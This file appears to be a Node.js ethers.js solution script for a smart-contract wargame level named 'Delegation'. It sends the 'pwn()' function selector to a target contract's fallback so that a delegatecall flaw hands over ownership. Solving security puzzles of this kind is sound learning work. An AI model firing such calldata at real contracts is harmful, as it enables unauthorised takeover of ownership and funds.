const { Signer, ethers, utils } = require("ethers");
const { providers, Wallet, Contract } = require("ethers").ethers;
const { parseUnits, formatUnits } = require('ethers').utils
const fs = require("fs")
require('dotenv').config();
const path = require('path')
require('dotenv').config({ path: path.resolve(__dirname, '../.env') })

const provider = new providers.WebSocketProvider(process.env.RPC_URL)
let wallet = new Wallet(process.env.PKEY).connect(provider)

const main = async (contractAddress, filename) => {

    const ABI = JSON.parse(fs.readFileSync(filename, "utf-8"))
    const target = new Contract(contractAddress, ABI, provider)
    const targetWithSigner = target.connect(wallet)

    let functionBytes = utils.toUtf8Bytes("pwn()")
    let functionSignature = utils.keccak256(functionBytes).slice(0,10)

    console.log("Sending tx with calldata: ", functionSignature)

    await triggerFallback(contractAddress, functionSignature)


}

const triggerFallback = async (_to, _data) => {

    tx = {
        to: _to,
        data: _data,
        gasLimit: utils.hexlify(100000)
    }

    let txresponse = await wallet.sendTransaction(tx)
    await txresponse.wait([confirms = 1])


}

let CA = "0x8Bf891CdddaD719023166c1de688ce02fc7789D7"
let FILENAME = "Delegation_abi.json"
main(CA, FILENAME)